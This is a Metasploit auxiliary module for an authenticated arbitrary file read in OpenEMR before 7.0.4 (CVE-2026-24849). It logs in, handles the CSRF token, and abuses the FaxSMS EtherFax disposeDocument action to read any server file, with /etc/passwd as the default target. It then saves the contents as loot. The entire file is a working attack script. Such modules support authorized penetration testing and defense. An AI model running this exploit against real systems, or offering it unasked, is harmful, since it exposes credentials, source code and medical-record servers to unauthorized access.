##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenEMR prior to 7.0.4 Authenticated Arbitrary File Read',
        'Description' => %q{
          Exploits an authenticated arbitrary file read in OpenEMR prior to 7.0.4
          (CVE-2026-24849). The FaxSMS module's EtherFaxActions disposeDocument
          action passes file_path directly to file_get_contents() without
          sanitisation, letting any authenticated user read arbitrary server-side
          files including /etc/passwd, database credentials, and application source.
        },
        'Author' => [
          'doany1',
          'Rezwanul Haque',
          'AMENDER'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-24849'],
          ['EDB', '52610']
        ],
        'DisclosureDate' => 'Jan 15, 2026',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to OpenEMR', '/']),
        OptString.new('USERNAME', [true, 'OpenEMR username', 'admin']),
        OptString.new('PASSWORD', [true, 'OpenEMR password', '']),
        OptString.new('SITE', [true, 'OpenEMR site name', 'default']),
        OptString.new('TARGETFILE', [true, 'Remote file path to read', '/etc/passwd'])
      ]
    )
  end

  def normalize_uri_path(*args)
    normalize_uri(target_uri.path, *args)
  end

  def do_login
    site = datastore['SITE']
    username = datastore['USERNAME']
    password = datastore['PASSWORD']

    print_status("Authenticating to OpenEMR as '#{username}'...")

    # Step 1: GET login page to prime session and extract CSRF token
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri_path('interface', 'login', 'login.php'),
      'vars_get' => {
        'site' => site
      }
    )

    unless res
      print_error('Connection failed while accessing login page')
      return nil
    end

    # Extract CSRF token if present
    csrf_token = nil
    if res.body =~ /csrf_token_form.*?value=["']([^"']+)["']/i
      csrf_token = ::Regexp.last_match(1)
      vprint_status("Found CSRF token: #{csrf_token}")
    end

    # Step 2: POST credentials to authenticate
    post_data = {
      'new_login_session_management' => '1',
      'authProvider' => 'Default',
      'authUser' => username,
      'clearPass' => password,
      'languageChoice' => '1'
    }
    post_data['csrf_token_form'] = csrf_token if csrf_token

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri_path('interface', 'main', 'main_screen.php'),
      'vars_get' => {
        'auth' => 'login',
        'site' => site
      },
      'vars_post' => post_data
    )

    unless res
      print_error('Connection failed during authentication')
      return nil
    end

    # Return the cookie jar for subsequent requests
    res
  end

  def read_file(file_path)
    site = datastore['SITE']
    faxsms_path = normalize_uri_path('interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php')
    actions = ['disposeDocument', 'disposeDoc']

    actions.each do |action|
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => faxsms_path,
        'vars_get' => {
          'site' => site,
          'type' => 'fax',
          'serviceType' => 'etherfax',
          '_ACTION_COMMAND' => action,
          'file_path' => file_path,
          'action' => 'download'
        }
      )

      unless res
        return { status: :error, message: 'Connection failed during file read' }
      end

      body = res.body.to_s

      # Check for authentication failure
      if body.include?('login_screen.php?error=1')
        return { status: :auth_fail, message: 'Session rejected - authentication failed' }
      end

      # Check for file not found/unreadable
      if body.include?('Problem with download')
        return { status: :not_found, message: 'File not found or unreadable' }
      end

      # Check for service not configured
      if body.downcase.include?('service is not found') || body.downcase.include?('install or turn service')
        next # Try next action name
      end

      # Empty response means wrong action name, try next
      next if body.strip.empty?

      # Success - we have file contents
      return { status: :ok, content: body }
    end

    { status: :not_found, message: 'File not found, unreadable, or Fax/SMS module not enabled with EtherFax' }
  end

  def run
    # Authenticate to OpenEMR
    auth_res = do_login
    return if auth_res.nil?

    # Verify authentication by attempting to read a safe probe file
    print_status('Verifying authentication and vulnerability...')
    probe_result = read_file('/etc/hostname')

    case probe_result[:status]
    when :auth_fail
      print_error('Login failed - check credentials and site name')
      return
    when :not_found
      print_warning('Logged in, but probe file read returned nothing.')
      print_warning('Confirm the Fax/SMS module is enabled with EtherFax as the provider.')
    when :error
      print_error(probe_result[:message])
      return
    else
      print_good('Authenticated; CVE-2026-24849 file-read confirmed.')
    end

    # Read the target file
    target_file = datastore['TARGETFILE']
    print_status("Reading remote file: #{target_file}")

    result = read_file(target_file)

    case result[:status]
    when :ok
      print_good('File content:')
      print_line(result[:content])

      # Store the loot
      loot_path = store_loot(
        'openemr.file',
        'text/plain',
        rhost,
        result[:content],
        target_file,
        'OpenEMR arbitrary file read via CVE-2026-24849'
      )
      print_good("File saved to: #{loot_path}")

      # Report the vulnerability
      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: references,
        info: "Successfully read #{target_file}"
      )
    when :auth_fail
      print_error('Session rejected - authentication or ACL problem')
    when :not_found
      print_error("File '#{target_file}' not found/readable, or Fax/SMS+EtherFax is not enabled")
    when :error
      print_error(result[:message])
    end
  end
end